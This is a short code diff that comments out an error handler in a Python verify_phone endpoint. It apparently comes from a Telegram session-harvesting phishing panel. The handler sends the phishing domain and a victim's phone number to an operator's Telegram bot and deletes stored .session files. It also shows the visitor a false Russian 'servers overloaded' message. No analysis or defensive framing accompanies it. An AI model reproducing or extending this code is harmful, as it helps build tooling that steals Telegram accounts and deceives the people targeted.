@@ -896,25 +896,25 @@ async def verify_phone():
 
 
 
-    except Exception as e:
-        print(e)
-        return
-        data = db.GetBotData(username)
-        chat_id = data[0][0]
-        bot_token = data[0][1]
-        bot = Bot(chat_id, bot_token)
-        if client.is_connected():
-            await client.disconnect()
-        bot.sendMessage(f"""
-<b>Домен: </b>{domain}
-<b>Номер: </b><code>{phone}</code>
-<b>Ошибка: </b><code>{e}</code>
-""")
-        if is_to_admin == 0:
-            os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
-        else:
-            os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
-        return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})
+#     except Exception as e:
+#         print(e)
+#         return e
+#         data = db.GetBotData(username)
+#         chat_id = data[0][0]
+#         bot_token = data[0][1]
+#         bot = Bot(chat_id, bot_token)
+#         if client.is_connected():
+#             await client.disconnect()
+#         bot.sendMessage(f"""
+# <b>Домен: </b>{domain}
+# <b>Номер: </b><code>{phone}</code>
+# <b>Ошибка: </b><code>{e}</code>
+# """)
+#         if is_to_admin == 0:
+#             os.remove(f'./admin_logs/sessions/{phone[1:]}.session')
+#         else:
+#             os.remove(f'./users/{username}/sessions/{phone[1:]}.session')
+#         return jsonify({'status': 'internal_error', 'message': 'Извините, сервера перегружены (Внутренная ошибка)'})
 
 
 
